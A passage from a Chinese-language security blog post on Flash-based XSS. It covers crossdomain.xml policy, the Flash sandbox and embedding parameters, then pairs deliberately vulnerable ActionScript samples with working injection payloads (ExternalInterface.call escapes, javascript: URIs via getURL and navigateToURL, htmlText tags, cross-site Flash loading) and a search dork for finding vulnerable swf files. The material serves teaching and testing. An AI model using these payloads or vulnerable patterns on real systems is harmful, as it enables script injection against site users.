Mi1k7ea extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function Mi1k7ea()</span><br><span class="line">        &#123;</span><br><span class="line">            ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入bin目录输入如<code>mxmlc c:\..\..\Mi1k7ea.as</code>的命令即可生成Mi1k7ea.swf文件：</p><p><img src="/2019/07/21/Flash型XSS小结/12.png" alt=""></p><p>放到Web目录访问即可触发：</p><p><img src="/2019/07/21/Flash型XSS小结/13.png" alt=""></p><p>2、使用Adobe Flash CS系列软件：</p><p>本地用的是Adobe Flash CS6。</p><p>编写如下fla文件：</p><p><img src="/2019/07/21/Flash型XSS小结/14.png" alt=""></p><p>然后Ctrl+Enter或者点击文件&gt;导出&gt;导出影片来编译成swf文件，再访问即可触发：</p><p><img src="/2019/07/21/Flash型XSS小结/15.png" alt=""></p><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><ul><li>FFDec或硕思闪客精灵软件</li><li>在线反编译网站：<a href="http://www.showmycode.com" target="_blank" rel="noopener">http://www.showmycode.com</a></li></ul><h3 id="Flash调用与跨域请求"><a href="#Flash调用与跨域请求" class="headerlink" title="Flash调用与跨域请求"></a>Flash调用与跨域请求</h3><p>Flash的调用和请求情形分别如下：</p><ol><li>HTML调用Flash时，Flash可以改后缀名；</li><li>Flash可以单独访问，但是其效果类似于HTML调用同域的Flash，但是后缀必须是swf；</li><li>Flash发动请求时，是根据Flash的域来判断的，而不是HTML来判断：</li></ol><p>（1）Flash请求同域资源时，直接忽视crossdomain.xml；</p><p>（2）Flash请求外域资源时，受外域下crossdomain.xml里的策略限制；</p><p>可知，Flash跨域请求时主要受crossdomain.xml文件的影响。</p><p>crossdomain.xml文件严格遵循XML语法，主要作用就是当被Flash请求到本域资源的时候，是否允许请求。 例如：<a href="http://www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。" target="_blank" rel="noopener">www.evil.com中嵌入一个Flash，Flash跨域请求www.q.com下的资源，此时会先查看www.q.com目录下的crossdomain.xml文件，查看是否允许evil.com域Flash请求本域的资源。</a></p><p>crossdomain.xml文件主要包含如下几个节点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site-control，allow-access-<span class="keyword">from</span>，allow-access-<span class="keyword">from</span>-identity，allow-http-request-headers-<span class="keyword">from</span></span><br></pre></td></tr></table></figure><p>常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。</p><p>示例crossdomain.xml文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span>   </span><br><span class="line"><span class="meta">&lt;!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">site-control</span> <span class="attr">permitted-cross-domain-policies</span>=<span class="string">"master-only"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许example.com及其子域访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*.example.com"</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 允许http://www.example.com访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"www.example.com"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allow-http-request-headers-from</span> <span class="attr">domain</span>=<span class="string">"*.csdn.net"</span> <span class="attr">headers</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：这个文件常常被用到Flash型CSRF中，当allow-access-from domain被设置为*后，可能存在Flash型CSRF的风险。</p><h3 id="Flash与相关的HTTP头字段"><a href="#Flash与相关的HTTP头字段" class="headerlink" title="Flash与相关的HTTP头字段"></a>Flash与相关的HTTP头字段</h3><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>Flash请求的Referer为空或者为该swf文件地址。</p><p>当为直接发请求的API时不带Referer；当HTML调用外域的Flash时，Flash发送的请求的Referer是Flash的地址而不是HTML的地址。</p><p>当HTML页面调用Flash时，此时Flash文件可以改后缀，那么我们请求的Referer就会变成Flash修改后对应的文件的后缀，比如Flash文件后缀改为gif，则通过该Flash请求时的Referer为<code>Referer: http://a.com/exp.gif</code>。</p><h4 id="x-flash-version"><a href="#x-flash-version" class="headerlink" title="x-flash-version"></a>x-flash-version</h4><p>Flash发送请求时会在HTTP头中添加x-flash-version字段来标识版本。</p><h3 id="Flash安全沙箱"><a href="#Flash安全沙箱" class="headerlink" title="Flash安全沙箱"></a>Flash安全沙箱</h3><p>Flash安全沙盒定义了各个Flash应用程序可以访问的数据及操作的范围，用于控制swf文件间跨域访问。如果两个域之间没有进行信任授权是无法进行数据交互的。</p><p>两个不同安全域下的swf文件之间是不能互相交互数据的。如果想让两个处于不同安全域内的swf文件进行数据交互通信，必须要经过授权来实现。经过数据通信授权后即可进行数据通信交互。</p><h4 id="swf文件之间跨域访问的授权"><a href="#swf文件之间跨域访问的授权" class="headerlink" title="swf文件之间跨域访问的授权"></a>swf文件之间跨域访问的授权</h4><p>ActionScript中关于SWF文件跨域信任授权访问是通过Security.allowDomain()方法来实现的。这个方法是应用于swf文件跨域加载swf文件并访问其内部属性、方法、类等的场景。</p><p>例如，<a href="http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件：" target="_blank" rel="noopener">http://a.example.com/a.swf代码，请求访问b.example.com域名下的b.swf文件：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var loader:Loader =new Loader();</span><br><span class="line">loader.contentLoaderInfo.addEventListener(Event.INIT,init);</span><br><span class="line">var url:String=&quot;http://b.example.com/b.swf&quot;;</span><br><span class="line">loader.load(new URLRequest(url));</span><br><span class="line">function init(event:Event):void</span><br><span class="line">&#123;  trace(loader.content);&#125;</span><br></pre></td></tr></table></figure><p><a href="http://b.example.com/b.swf的代码：" target="_blank" rel="noopener">http://b.example.com/b.swf的代码：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Security.allowDomain(&quot;a.example.com&quot;);</span><br><span class="line">Security.allowDomain(&quot;*&quot;);</span><br></pre></td></tr></table></figure><p>上面是两种不同的设置方式：</p><ol><li><p>只允许a.example.com访问b.example.com中的SWF文件</p></li><li><p>如果使用*号那么任何域中的SWF文件都能访问执行调用b.exaple.com中的SWF文件。</p></li></ol><h4 id="HTML跨域加载Flash时的授权"><a href="#HTML跨域加载Flash时的授权" class="headerlink" title="HTML跨域加载Flash时的授权"></a>HTML跨域加载Flash时的授权</h4><p>在HTML页面嵌入Flash时，其中的Object和Embed标签都有allowScriptAccess参数和allowNetworking参数，主要是用于在HTML页面调用执行Flash文件的场景。</p><p>allowScriptAccess：控制html页面与Flash页面的通讯。</p><ul><li>always：html和Flash页面的通讯不做任何的限制；</li><li>samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；</li><li>never：html和Flash禁止通讯。</li></ul><p>allowNetworking：控制Flash与外部的网络通讯。</p><ul><li>all：Flash所有的网络API通讯接口都可用；</li><li>internal：navigateToURL，fscommand，ExternalInterface.call不可用；</li><li>none：所有的网络API不可用。</li></ul><h3 id="HTML中嵌入Flash"><a href="#HTML中嵌入Flash" class="headerlink" title="HTML中嵌入Flash"></a>HTML中嵌入Flash</h3><p>在HTML中嵌入FLASH的时候在IE和非IE浏览器下嵌入的方式有所不同，可以使用embed标签和object标签。</p><p>IE下嵌入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">codeBase</span>=<span class="string">"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0"</span> <span class="attr">classid</span>=<span class="string">"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://example.com/exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非IE下嵌入（IE8能成功，本地最新IE11也OK）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"./exp.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"./exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非IE下嵌入的Demo示例，嵌入同源站点的Mi1k7ea.swf，其作用是弹框：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"lso"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"http://127.0.0.1/Mi1k7ea.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://127.0.0.1/Mi1k7ea.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Firefox上访问直接触发，然而本地最新版的IE11也能成功嵌入触发：</p><p><img src="/2019/07/21/Flash型XSS小结/11.png" alt=""></p><h3 id="Flash的参数传递"><a href="#Flash的参数传递" class="headerlink" title="Flash的参数传递"></a>Flash的参数传递</h3><p>Flash的参数传递形式按ActionScript语言的版本来分：</p><ul><li>ActionScript 2：以<code>_root.argv</code>形式，argv直接就是参数名</li><li>ActionScript 3：以<code>loaderInfo.parameters</code>形式，返回key和value的字典结构。</li></ul><h2 id="0x02-Flash-XSS"><a href="#0x02-Flash-XSS" class="headerlink" title="0x02 Flash XSS"></a>0x02 Flash XSS</h2><p>Flash型XSS，即由Flash插件引起的一系列XSS问题，主要有以下两种方式：</p><ul><li>与JavaScript通信引发的XSS；</li><li>加载第三方资源引发的XSS；</li></ul><h3 id="ExternalInterface-call"><a href="#ExternalInterface-call" class="headerlink" title="ExternalInterface.call"></a>ExternalInterface.call</h3><p>Flash中可以使用ExternalInterface.call来执行JavaScript代码。</p><p>ExternalInterface.callzhong1可传递0个参数或传递多个参数，这里我们只探讨如下两个：</p><ul><li>ExternalInterface.call(“函数名”)</li><li>ExternalInterface.call(“函数名”,”参数”)</li></ul><h4 id="第一个参数可控"><a href="#第一个参数可控" class="headerlink" title="第一个参数可控"></a>第一个参数可控</h4><p>FlashXss.as，这里我们可以传入第一个参数值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class FlashXss extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function FlashXss()</span><br><span class="line">        &#123;</span><br><span class="line">            var jsFunction:String = loaderInfo.parameters.movieName;</span><br><span class="line">            var param:String = &quot;Mi1k7ea&quot;;</span><br><span class="line">            ExternalInterface.call(jsFunction, param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将该as文件编译成swf文件：</p><p><img src="/2019/07/21/Flash型XSS小结/1.png" alt=""></p><p>将该swf放在Web目录下。尝试访问并输入payload<code>?movieName=alert</code>，在Chrome下不能成功执行swf而是变成了下载文件，换了Firefox和IE就可以了：</p><p><img src="/2019/07/21/Flash型XSS小结/2.png" alt=""></p><p>再次输入<code>?movieName=alert(&#39;hacked&#39;)</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/3.png" alt=""></p><p>使用IE的开发者工具调试，F12打开IE的开发人员工具-&gt;脚本-&gt;启动调试-&gt;全部中断，再次访问URL即可中断下来：</p><p><img src="/2019/07/21/Flash型XSS小结/6.png" alt=""></p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123; __flash__toXML(alert(<span class="string">'hacked'</span>)(<span class="string">"Mi1k7ea"</span>)) ; &#125; <span class="keyword">catch</span> (e) &#123; <span class="string">"&lt;undefined/&gt;"</span>; &#125;</span><br></pre></td></tr></table></figure><p>上面这段代码是ExternalInterface.call底层代码。可以看到是对输入参数直接拼接到了相应的JavaScript代码中，而这段代码会先执行alert(‘hacked’)，然后将alert(‘hacked’)(“Mi1k7ea”)的返回值传入__flash__toXML()函数。</p><h4 id="第二个参数可控"><a href="#第二个参数可控" class="headerlink" title="第二个参数可控"></a>第二个参数可控</h4><p>FlashXss.as，这里我们只能控制传入第二个参数值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class FlashXss extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function FlashXss()</span><br><span class="line">        &#123;</span><br><span class="line">            // 定义字符串变量名jsFunction，值从url的movieName获取</span><br><span class="line">            var param:String = loaderInfo.parameters.movieName;</span><br><span class="line">            ExternalInterface.call(&quot;console.log&quot;, param);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload<code>?movieName=\&quot;));alert(&#39;mi1k7ea&#39;);}catch(e){}//</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/4.png" alt=""></p><p>我们在IE的开发者工具中调试分析看看，先输入<code>?movieName=mi1k7ea&quot;</code>，即测试双引号是否被转义：</p><p><img src="/2019/07/21/Flash型XSS小结/7.png" alt=""></p><p>可以看到是对双引号进行了转义。</p><p>因此，当我们输入反斜杠和双引号后，由于反引号会被转义掉，从而使其后面的双引号可以逃逸出来让console.log()的双引号得以闭合，然后再构造后面恶意的JS代码即可。在IE调试下的结构如图：</p><p><img src="/2019/07/21/Flash型XSS小结/8.png" alt=""></p><h3 id="getURL"><a href="#getURL" class="headerlink" title="getURL"></a>getURL</h3><p>在Flash中ActionScript 2可以使用getURL来执行JavaScript。</p><p>getURLTest.fla：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var Fei_xml:XML = new XML(); //创建xml对象</span><br><span class="line">Fei_xml.ignoreWhite = true;  //</span><br><span class="line">Fei_xml.onLoad = function()&#123; getURL(Fei_xml.childNodes[0].childNodes[0].childNodes[0].nodeValue);&#125; //获取值</span><br><span class="line">Fei_xml.load(_root.mi1k7ea);  //加载XML文档</span><br></pre></td></tr></table></figure><p>使用FlashCS6编译成swf。</p><p>在Web目录中编辑a.xml文件，用于触发XSS：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span>&gt;</span>javascript:alert('Flash XSS')<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：childNodes[0]的个数和目标XML文件中JS代码所在的内嵌标签数量有关，必须设置正确才能成功触发。</p><p>URL参数栏输入目标XML文件即可触发XSS：</p><p><img src="/2019/07/21/Flash型XSS小结/16.png" alt=""></p><p>造成Flash XSS的主要原因就是没对<code>?mi1k7ea=a.xml</code>获取的内容进行过滤导致的。</p><p>这里提供一个查找此类漏洞文件的Google Hack关键字：filetype:swf   inurl:xml</p><h3 id="navigateToURL"><a href="#navigateToURL" class="headerlink" title="navigateToURL"></a>navigateToURL</h3><p>在ActionScript 3中已经不在支持getURL了，但可以用navigateToURL来执行JavaScript。</p><p>navigateToURLTest.as，这里用Flex编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">import flash.display.Sprite;</span><br><span class="line">import flash.events.Event;</span><br><span class="line">import flash.net.URLLoader;</span><br><span class="line">import flash.net.URLRequest;</span><br><span class="line">import flash.net.navigateToURL;</span><br><span class="line"></span><br><span class="line">public class navigateToURLTest extends Sprite</span><br><span class="line">&#123;</span><br><span class="line">public function navigateToURLTest()</span><br><span class="line">&#123;</span><br><span class="line">var url:String = stage.loaderInfo.parameters.url   //获取url参数值</span><br><span class="line">var req:URLRequest = new URLRequest(&quot;flash.xml&quot;);</span><br><span class="line">var ld:URLLoader = new URLLoader();</span><br><span class="line">ld.addEventListener(Event.COMPLETE ,ok);</span><br><span class="line">function ok(evtObj:Event):void &#123;</span><br><span class="line">if(ld.data)&#123;</span><br><span class="line">//navigateToURL(new URLRequest(&quot;javascript:alert(&quot;+url+&quot;)&quot;),&apos;_self&apos;)</span><br><span class="line">navigateToURL(new URLRequest(url),&apos;_self&apos;) //通过navigateToURL调用执行</span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ld.load(req)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload<code>?url=javascript:alert(&#39;navigateToURL hacked&#39;)</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/5.png" alt=""></p><h3 id="htmlText"><a href="#htmlText" class="headerlink" title="htmlText"></a>htmlText</h3><p>在Flash里支持HTMLText属性，HTMLText的作用是显示html标签等。</p><p>htmlTextTest.as：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">import flash.display.Sprite;</span><br><span class="line">import flash.text.TextField;</span><br><span class="line"></span><br><span class="line">public class htmlTextTest extends Sprite</span><br><span class="line">&#123;</span><br><span class="line">public function htmlTextTest()</span><br><span class="line">&#123;</span><br><span class="line">var a:String = root.loaderInfo.parameters.Mi1k7ea //获取提交参数的值</span><br><span class="line">var info:TextField = new TextField();  //创建控件对象</span><br><span class="line">info.multiline=true;</span><br><span class="line">info.wordWrap=true;</span><br><span class="line">info.htmlText = a; //显示</span><br><span class="line">addChild(info);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flash支持htmlText属性，其作用是显示html标签等。这里我们可以使用img或a标签触发xss代码。</p><h4 id="a标签触发Flash-XSS"><a href="#a标签触发Flash-XSS" class="headerlink" title="a标签触发Flash XSS"></a>a标签触发Flash XSS</h4><p>先看用a标签的情况，在href中输入js伪协议实现执行js代码，从而触发Flash XSS。</p><p>输入payload<code>?Mi1k7ea=&lt;a href=&#39;javascript:alert(&quot;htmlText hacked&quot;)&#39;&gt;Click Me!&lt;/a&gt;</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/9.png" alt=""></p><h4 id="img标签触发XSF"><a href="#img标签触发XSF" class="headerlink" title="img标签触发XSF"></a>img标签触发XSF</h4><p>这里我们使用img标签来加载一个远程含有JS跨站代码的swf文件从而实现XSF攻击。</p><p>远程含有XSS代码的swf文件，这里简单写个例子Mi1k7ea.as：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">    import flash.display.Sprite;</span><br><span class="line">    import flash.external.ExternalInterface;</span><br><span class="line">       </span><br><span class="line">    public class Mi1k7ea extends Sprite</span><br><span class="line">    &#123;</span><br><span class="line">        public function Mi1k7ea()</span><br><span class="line">        &#123;</span><br><span class="line">            ExternalInterface.call(&apos;alert(&quot;XSF Hacked&quot;)&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译好swf文件后放置在远程服务器中。</p><p>输入payload<code>?Mi1k7ea=&lt;img src=&#39;http://127.0.0.1/Mi1k7ea.swf&#39;&gt;</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/10.png" alt=""></p><h3 id="未初始化变量导致的XSS"><a href="#未初始化变量导致的XSS" class="headerlink" title="未初始化变量导致的XSS"></a>未初始化变量导致的XSS</h3><p>在PHP中Globals全局变量在开启的时候，允许在POST个GET参数中改变php脚本中变量的值，也就是经典的全局变量导致的变量覆盖漏洞。在ActionScript 2中也有类似的特性，任何未被初始化的变量都可以以POST或GET方式来改变变量的值，因此会导致一些安全问题。</p><p>var.fla，这里未初始化user变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(user)</span><br><span class="line">&#123;</span><br><span class="line">getURL(_root.mi1k7ea);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入payload<code>?user=1&amp;mi1k7ea=javascript:alert(&#39;var hacked&#39;)</code>：</p><p><img src="/2019/07/21/Flash型XSS小结/17.png" alt=""></p><h3 id="XSF"><a href="#XSF" class="headerlink" title="XSF"></a>XSF</h3><p>跨站Flash攻击，就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件，这样就有可能造成XSF攻击，以下函数如果使用不当就很容易产生XSF问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">XML.load(&apos;URL&apos;)</span><br><span class="line">LoadVars.load(&apos;url&apos;)</span><br><span class="line">Sound.loadSound(&apos;url&apos;)</span><br><span class="line">NetStream.play(&apos;url&apos;)</span><br></pre></td></tr></table></figure><p>通过这些恶意接口，可以指定URL为我们构造的恶意文件如swf或xml文件，从而在目标网站实现JS攻击。</p><p>直接看个例子，XSFTest.as：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package</span><br><span class="line">&#123;</span><br><span class="line">import flash.display.Sprite;</span><br><span class="line">import flash.display.Loader;</span><br><span class="line">import flash.net.URLRequest;</span><br><span class="line"></span><br><span class="line">public class XSFTest extends Sprite</span><br><span class="line">&#123;</span><br><span class="line">public function XSFTest()</span><br><span class="line">&#123;</span><br><span class="line">var param:Object = root.loaderInfo.parameters;</span><br><span class="line">var swf:String = param[&quot;swf&quot;];</span><br><span class="line">var myLoader:Loader = new Loader();</span><br><span class="line">var url:URLRequest = new URLRequest(swf);</span><br><span class="line">myLoader.load(url);</span><br><span class="line">addChild(myLoader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XSF.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">id</span>=<span class="string">"lso"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"http://127.0.0.1/XSFTest.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://127.0.0.1/XSFTest.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span 